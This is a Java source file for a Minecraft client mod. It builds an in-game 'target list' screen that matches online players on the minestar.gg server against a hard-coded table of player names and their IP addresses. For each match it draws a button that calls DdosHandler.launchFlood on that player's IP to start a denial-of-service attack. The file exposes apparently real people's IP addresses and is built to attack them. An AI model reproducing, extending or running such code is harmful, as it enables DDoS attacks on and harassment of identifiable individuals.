package com.example.mod.client;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.text.Text;

import java.util.Collection;
import java.util.HashMap;
import java.util.Map;

public class TargetListScreen extends Screen {
    private static final Map<String, String> MASTER_DATABASE = new HashMap<>();

    static {
        MASTER_DATABASE.put("rasista21121", "188.33.250.155");
        MASTER_DATABASE.put("Patim16", "193.24.247.152");
        MASTER_DATABASE.put("_J0kerrrrrrrrrr", "213.134.175.246");
        MASTER_DATABASE.put("unlovemerc", "145.239.19.207");
        MASTER_DATABASE.put("Karol_Wisniewski", "145.239.236.30");
        MASTER_DATABASE.put("TrapMain666", "77.222.2");
    }

    public TargetListScreen() {
        super(Text.literal("Digital Fortress - minestar.gg Live Scanner"));
    }

    @Override
    protected void init() {
        super.init();
        int yOffset = 40;

        MinecraftClient client = MinecraftClient.getInstance();
        
        if (client.getNetworkHandler() != null) {
            Collection<PlayerListEntry> onlinePlayers = client.getNetworkHandler().getPlayerList();

            for (PlayerListEntry entry : onlinePlayers) {
                String playerName = entry.getProfile().getName();

                if (MASTER_DATABASE.containsKey(playerName)) {
                    String ip = MASTER_DATABASE.get(playerName);

                    this.addDrawableChild(ButtonWidget.builder(
                        Text.literal("🎯 [ONLINE] " + playerName + " -> BOMBA"), 
                        button -> {
                            System.out.println("[GHOST-STRIKE] Trafiono cel na minestar.gg: " + playerName + " [" + ip + "]");
                            com.example.mod.network.DdosHandler.launchFlood(ip);
                        }
                    ).dimensions(this.width / 2 - 175, yOffset, 350, 20).build());

                    yOffset += 25;
                    if (yOffset > this.height - 40) break;
                }
            }
        }
        
        if (yOffset == 40) {
            System.out.println("[GHOST-STRIKE] Brak celów z bazy na aktualnym serwerze minestar.gg.");
        }
    }

    @Override
    public void render(DrawContext context, int mouseX, int mouseY, float delta) {
        this.renderBackground(context, mouseX, mouseY, delta);
        context.drawCenteredTextWithShadow(this.textRenderer, this.title, this.width / 2, 15, 0xFF5555);
        super.render(context, mouseX, mouseY, delta);
    }
}
